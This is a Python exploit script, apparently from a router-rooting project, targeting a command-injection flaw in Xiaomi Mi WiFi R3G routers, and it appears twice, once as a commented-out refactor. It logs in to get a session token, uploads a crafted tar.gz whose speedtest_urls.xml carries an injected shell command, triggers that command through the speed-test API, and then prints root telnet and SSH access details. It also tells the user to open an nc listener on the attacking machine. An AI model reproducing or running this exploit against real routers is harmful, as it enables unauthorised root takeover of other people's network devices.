# #!/usr/bin/python
# import os
# import shutil
# import tarfile
# import requests
# import sys
# import re
# import time
# import random
# import hashlib
# import platform
# import socket
#
# from stdout_colour import Colored
# from tcp_file_server import TcpFileServer
#
#
# # # make sure that script.sh on windows uses \n
# # if platform.system() == "Windows":
# #     with open("script.sh", "rt", encoding="UTF-8") as f:
# #         content = f.read()
# #     with open("script.sh", "wt", encoding="UTF-8", newline="\n") as f:
# #         f.write(content)
# #
# # router_ip_address = "miwifi.com"
# # # router_ip_address = "192.168.31.1"
# # router_ip_address = input(
# #     "Router IP address [press enter for using the default '{}']: ".format(router_ip_address)) or router_ip_address
# #
# #
# # # get stok
# # def get_stok(router_ip_address):
# #     try:
# #         r0 = requests.get("http://{router_ip_address}/cgi-bin/luci/web".format(router_ip_address=router_ip_address))
# #     except:
# #         print("Xiaomi router not found...")
# #         return None
# #     try:
# #         mac = re.findall(r'deviceId = \'(.*?)\'', r0.text)[0]
# #     except:
# #         print("Xiaomi router not found...")
# #         return None
# #     key = re.findall(r'key: \'(.*)\',', r0.text)[0]
# #     nonce = "0_" + mac + "_" + str(int(time.time())) + "_" + str(random.randint(1000, 10000))
# #     router_password = input("Enter router admin password: ")
# #     account_str = hashlib.sha1((router_password + key).encode('utf-8')).hexdigest()
# #     password = hashlib.sha1((nonce + account_str).encode('utf-8')).hexdigest()
# #     data = "username=admin&password={password}&logtype=2&nonce={nonce}".format(password=password, nonce=nonce)
# #     r1 = requests.post(
# #         "http://{router_ip_address}/cgi-bin/luci/api/xqsystem/login".format(router_ip_address=router_ip_address),
# #         data=data,
# #         headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
# #                  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})
# #     try:
# #         stok = re.findall(r'"token":"(.*?)"', r1.text)[0]
# #     except:
# #         print("Failed to get stok in login response '{}'".format(r1.text))
# #         return None
# #     return stok
# #
# #
# # stok = get_stok(router_ip_address) or input("You need to get the stok manually, then input the stok here: ")
# # print("""There two options to provide the files needed for invasion:
# #    1. Use a local TCP file server runing on random port to provide files in local directory `script_tools`.
# #    2. Download needed files from remote github repository. (choose this option only if github is accessable inside router device.)""")
# # use_local_file_server = (input("Which option do you prefer? (default: 1)") or "1") == "1"
# #
# # # From https://blog.securityevaluators.com/show-mi-the-vulns-exploiting-command-injection-in-mi-router-3-55c6bcb48f09
# # # In the attacking machine (macos), run the following before executing this script: /usr/bin/nc -l 4444
# # command = "((sh /tmp/script.sh exploit) &)"
# #
# # # proxies = {"http":"http://127.0.0.1:8080"}
# # proxies = {}
# #
# # if os.path.exists("build"):
# #     shutil.rmtree("build")
# # os.makedirs("build")
# #
# # # make config file
# # speed_test_filename = "speedtest_urls.xml"
# # with open("speedtest_urls_template.xml", "rt", encoding="UTF-8") as f:
# #     template = f.read()
# # data = template.format(router_ip_address=router_ip_address, command=command)
# # # print(data)
# # with open("build/speedtest_urls.xml", "wt", encoding="UTF-8", newline="\n") as f:
# #     f.write(data)
# #
# # print("****************")
# # print("router_ip_address: " + router_ip_address)
# # print("stok: " + stok)
# # print("file provider: " + ("local file server" if use_local_file_server else "remote github repository"))
# # print("****************")
# #
# # # Make tar
# # with tarfile.open("build/payload.tar.gz", "w:gz") as tar:
# #     tar.add("build/speedtest_urls.xml", "speedtest_urls.xml")
# #     tar.add("script.sh")
# #     # tar.add("busybox")
# #     # tar.add("extras/wget")
# #     # tar.add("extras/xiaoqiang")
# #
# # # upload config file
# # print("start uploading config file...")
# # r1 = requests.post(
# #     "http://{}/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(router_ip_address, stok),
# #     files={"image": open("build/payload.tar.gz", 'rb')},
# #     proxies=proxies
# # )
# #
# #
# # # print(r1.text)
# #
# # def send_test_netspeed_request(router_ip_address, stok, port):
# #     r = requests.get(
# #         "http://{}/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed?{}".format(router_ip_address, stok, port),
# #         proxies=proxies
# #     )
# #     # print(r.text)
# #
# #
# # # exec download speed test, exec command
# # print("start exec command...")
# # if use_local_file_server:
# #     from tcp_file_server import TcpFileServer
# #
# #     file_server = TcpFileServer("script_tools")
# #
# #     with file_server:
# #         # The TCP file server will use a random port number.
# #         # And this port number will be sent to the router luci web server through query parameters of testing net speed request here.
# #         # Then in the injected `script.sh`, we can get the client IP address and file server port
# #         # through CGI variables `REMOTE_ADDR` and `QUERY_STRING` to download needed files.
# #         send_test_netspeed_request(router_ip_address, stok, file_server.port)
# # else:  # Use remote github repository. port setted to 0.
# #     send_test_netspeed_request(router_ip_address, stok, port=0)
# #
# # retry = 3
# # delay = 1
# # timeout = 3
# #
# #
# # def isOpen(ip, port):
# #     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# #     s.settimeout(timeout)
# #     try:
# #         s.connect((ip, int(port)))
# #         s.shutdown(socket.SHUT_RDWR)
# #         return True
# #     except:
# #         return False
# #     finally:
# #         s.close()
# #
# #
# # def checkHost(ip, port):
# #     ipup = False
# #     for i in range(retry):
# #         if isOpen(ip, port):
# #             ipup = True
# #             break
# #         else:
# #             time.sleep(delay)
# #     return ipup
# #
# #
# # if checkHost(router_ip_address, 22):
# #     print("done! Now you can connect to the router using several options: (user: root, password: root)")
# #     print("* telnet {}".format(router_ip_address))
# #     print(
# #         "* ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -c 3des-cbc -o UserKnownHostsFile=/dev/null root@{}".format(
# #             router_ip_address))
# #     print("* ftp: using a program like cyberduck")
# # else:
# #     print("Warning: the process has finished, but seems like ssh connection to the router is not working as expected.")
# #     print(
# #         "* Maybe your firmware version is not supported, please have a look at https://github.com/acecilia/OpenWRTInvasion/blob/master/README.md#unsupported-routers-and-firmware-versions")
# #     print("* Anyway you can try it with: telnet {}".format(router_ip_address))
#
#
# def get_router_ip_address():
#     """Prompt user for the router IP address, returning the default if none is provided."""
#     default_ip = "miwifi.com"
#     router_ip = input(
#         f"Router IP address [press enter for using the default '{default_ip}']: ") or default_ip
#     return router_ip
#
#
# def get_stok(router_ip_address):
#     """Get stok token for authentication."""
#     try:
#         response = requests.get(f"http://{router_ip_address}/cgi-bin/luci/web")
#         mac = re.findall(r'deviceId = \'(.*?)\'', response.text)[0]
#         key = re.findall(r'key: \'(.*)\',', response.text)[0]
#     except (IndexError, requests.RequestException):
#         Colored.error("Xiaomi router not found...")
#         return None
#
#     nonce = f"0_{mac}_{int(time.time())}_{random.randint(1000, 10000)}"
#     router_password = input("Enter router admin password: ")
#     account_str = hashlib.sha1((router_password + key).encode('utf-8')).hexdigest()
#     password = hashlib.sha1((nonce + account_str).encode('utf-8')).hexdigest()
#     data = f"username=admin&password={password}&logtype=2&nonce={nonce}"
#
#     try:
#         login_response = requests.post(
#             f"http://{router_ip_address}/cgi-bin/luci/api/xqsystem/login",
#             data=data,
#             headers={
#                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
#                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
#             }
#         )
#         stok = re.findall(r'"token":"(.*?)"', login_response.text)[0]
#     except (IndexError, requests.RequestException):
#         Colored.error(f"Failed to get stok in login response: '{login_response.text}'")
#         return None
#
#     return stok
#
#
# def run_invasion():
#     """Main function to run the invasion process."""
#     router_ip_address = get_router_ip_address()
#     stok = get_stok(router_ip_address) or input("You need to get the stok manually, then input the stok here: ")
#
#     print("""There are two options to provide the files needed for invasion:
#    1. Use a local TCP file server running on a random port to provide files in local directory `script_tools`.
#    2. Download needed files from remote GitHub repository. (choose this option only if GitHub is accessible inside the router device.)""")
#     use_local_file_server = (input("Which option do you prefer? (default: 1) ") or "1") == "1"
#
#     # Command to be executed on the router
#     command = "((sh /tmp/script.sh exploit) &)"
#
#     # Prepare build directory
#     if os.path.exists("build"):
#         shutil.rmtree("build")
#     os.makedirs("build")
#
#     # Create configuration file
#     with open("speedtest_urls_template.xml", "rt", encoding="UTF-8") as f:
#         template = f.read()
#     data = template.format(router_ip_address=router_ip_address, command=command)
#     with open("build/speedtest_urls.xml", "wt", encoding="UTF-8", newline="\n") as f:
#         f.write(data)
#
#     Colored.success("Configuration file created.")
#
#     # Create tarball of necessary files for upload
#     with tarfile.open("build/payload.tar.gz", "w:gz") as tar:
#         tar.add("build/speedtest_urls.xml", "speedtest_urls.xml")
#         tar.add("script.sh")  # Ensure script.sh is present in the same directory
#
#     # Upload configuration file to the router
#     Colored.success("Starting to upload configuration file...")
#     with open("build/payload.tar.gz", 'rb') as tar_file:
#         upload_response = requests.post(
#             f"http://{router_ip_address}/cgi-bin/luci/;stok={stok}/api/misystem/c_upload",
#             files={"image": tar_file}
#         )
#
#     # Execute command to test network speed
#     Colored.success("Starting to execute command...")
#     if use_local_file_server:
#         with TcpFileServer("script_tools") as file_server:
#             send_test_netspeed_request(router_ip_address, stok, file_server.port)
#     else:
#         send_test_netspeed_request(router_ip_address, stok, port=0)
#
#     # Check for SSH availability
#     if check_host_availability(router_ip_address, 22):
#         Colored.success("Done! Now you can connect to the router using several options: (user: root, password: root)")
#         Colored.success(f"* telnet {router_ip_address}")
#         Colored.success(
#             f"* ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -c 3des-cbc -o UserKnownHostsFile=/dev/null root@{router_ip_address}")
#         Colored.success("* ftp: using a program like Cyberduck")
#     else:
#         Colored.error(
#             "Warning: the process has finished, but the SSH connection to the router is not working as expected.")
#         Colored.error(f"* Maybe your firmware version is not supported. Please check the documentation.")
#
#
# def send_test_netspeed_request(router_ip_address, stok, port):
#     """Send test network speed request to the router."""
#     url = f"http://{router_ip_address}/cgi-bin/luci/;stok={stok}/api/xqnetwork/testnetspeed"
#     payload = {"hostname": "127.0.0.1", "port": port}
#
#     try:
#         response = requests.post(url, json=payload)
#         response.raise_for_status()  # Raises an error for bad responses
#         Colored.success("Network speed test initiated.")
#     except requests.RequestException as e:
#         Colored.error(f"Failed to initiate network speed test: {e}")
#
#
# def check_host_availability(host, port):
#     """Check if a given host is available on a specified port."""
#     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     sock.settimeout(5)  # Set a timeout of 5 seconds
#     try:
#         result = sock.connect_ex((host, port))
#         return result == 0  # Returns True if connection was successful
#     finally:
#         sock.close()



#!/usr/bin/python
# There is a remote command execution vulnerability in Xiaomi Mi WiFi R3G before version stable 2.28.23.
# The backup file is in tar.gz format. After uploading, the application uses the tar zxf command to decompress,
# so you can control the contents of the files in the decompressed directory.
# In addition, the application's sh script for testing upload and download speeds will read the url list from /tmp/speedtest_urls.xml,
# and there is a command injection vulnerability.

# discoverer: UltramanGaia from Kap0k & Zhiniang Peng from Qihoo 360 Core Security

# HOW TO RUN
# Install requirements
# pip3 install -r requirements.txt
# Run the script
# python3 remote_command_execution_vulnerability.py

import os
import shutil
import tarfile
import requests
import sys
import re
import time
import random
import hashlib
import platform
import socket

# make sure that script.sh on windows uses \n
if platform.system() == "Windows":
    with open("script.sh", "rt", encoding = "UTF-8") as f:
        content = f.read()
    with open("script.sh", "wt", encoding = "UTF-8", newline="\n") as f:
        f.write(content)

router_ip_address="miwifi.com"
#router_ip_address = "192.168.31.1"
router_ip_address = input("Router IP address [press enter for using the default '{}']: ".format(router_ip_address)) or router_ip_address

# get stok
def get_stok(router_ip_address):
    try:
        r0 = requests.get("http://{router_ip_address}/cgi-bin/luci/web".format(router_ip_address=router_ip_address))
    except:
        print ("Xiaomi router not found...")
        return None
    try:
        mac = re.findall(r'deviceId = \'(.*?)\'', r0.text)[0]
    except:
        print ("Xiaomi router not found...")
        return None
    key = re.findall(r'key: \'(.*)\',', r0.text)[0]
    nonce = "0_" + mac + "_" + str(int(time.time())) + "_" + str(random.randint(1000, 10000))
    router_password = input("Enter router admin password: ")
    account_str = hashlib.sha1((router_password + key).encode('utf-8')).hexdigest()
    password = hashlib.sha1((nonce + account_str).encode('utf-8')).hexdigest()
    data = "username=admin&password={password}&logtype=2&nonce={nonce}".format(password=password,nonce=nonce)
    r1 = requests.post("http://{router_ip_address}/cgi-bin/luci/api/xqsystem/login".format(router_ip_address=router_ip_address),
        data = data,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})
    try:
        stok = re.findall(r'"token":"(.*?)"',r1.text)[0]
    except:
        print("Failed to get stok in login response '{}'".format(r1.text))
        return None
    return stok

stok = get_stok(router_ip_address) or input("You need to get the stok manually, then input the stok here: ")
print("""There two options to provide the files needed for invasion:
   1. Use a local TCP file server runing on random port to provide files in local directory `script_tools`.
   2. Download needed files from remote github repository. (choose this option only if github is accessable inside router device.)""")
use_local_file_server = (input("Which option do you prefer? (default: 1)") or "1") == "1"

# From https://blog.securityevaluators.com/show-mi-the-vulns-exploiting-command-injection-in-mi-router-3-55c6bcb48f09
# In the attacking machine (macos), run the following before executing this script: /usr/bin/nc -l 4444
command = "((sh /tmp/script.sh exploit) &)"

# proxies = {"http":"http://127.0.0.1:8080"}
proxies = {}

if os.path.exists("build"):
    shutil.rmtree("build")
os.makedirs("build")

# make config file
speed_test_filename = "speedtest_urls.xml"
with open("speedtest_urls_template.xml", "rt", encoding = "UTF-8") as f:
    template = f.read()
data = template.format(router_ip_address=router_ip_address, command=command)
# print(data)
with open("build/speedtest_urls.xml", "wt", encoding = "UTF-8", newline = "\n") as f:
    f.write(data)

print("****************")
print("router_ip_address: " + router_ip_address)
print("stok: " + stok)
print("file provider: " + ("local file server" if use_local_file_server else "remote github repository"))
print("****************")

# Make tar
with tarfile.open("build/payload.tar.gz", "w:gz") as tar:
    tar.add("build/speedtest_urls.xml", "speedtest_urls.xml")
    tar.add("script.sh")
    # tar.add("busybox")
    # tar.add("extras/wget")
    # tar.add("extras/xiaoqiang")

# upload config file
print("start uploading config file...")
r1 = requests.post(
    "http://{}/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(router_ip_address, stok),
    files={"image": open("build/payload.tar.gz", 'rb')},
    proxies=proxies
)
# print(r1.text)

def send_test_netspeed_request(router_ip_address, stok, port):
    r = requests.get(
        "http://{}/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed?{}".format(router_ip_address, stok, port),
        proxies=proxies
    )
    # print(r.text)

# exec download speed test, exec command
print("start exec command...")
if use_local_file_server:
    from tcp_file_server import TcpFileServer
    file_server = TcpFileServer("script_tools")

    with file_server:
        # The TCP file server will use a random port number.
        # And this port number will be sent to the router luci web server through query parameters of testing net speed request here.
        # Then in the injected `script.sh`, we can get the client IP address and file server port
        # through CGI variables `REMOTE_ADDR` and `QUERY_STRING` to download needed files.
        send_test_netspeed_request(router_ip_address, stok, file_server.port)
else:  # Use remote github repository. port setted to 0.
    send_test_netspeed_request(router_ip_address, stok, port=0)

retry = 3
delay = 1
timeout = 3
def isOpen(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, int(port)))
        s.shutdown(socket.SHUT_RDWR)
        return True
    except:
        return False
    finally:
        s.close()

def checkHost(ip, port):
    ipup = False
    for i in range(retry):
        if isOpen(ip, port):
            ipup = True
            break
        else:
            time.sleep(delay)
    return ipup

if checkHost(router_ip_address, 22):
    print("done! Now you can connect to the router using several options: (user: root, password: root)")
    print("* telnet {}".format(router_ip_address))
    print("* ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -c 3des-cbc -o UserKnownHostsFile=/dev/null root@{}".format(router_ip_address))
    print("* ftp: using a program like cyberduck")
else:
    print("Warning: the process has finished, but seems like ssh connection to the router is not working as expected.")
    print("* Maybe your firmware version is not supported, please have a look at https://github.com/acecilia/OpenWRTInvasion/blob/master/README.md#unsupported-routers-and-firmware-versions")
    print("* Anyway you can try it with: telnet {}".format(router_ip_address))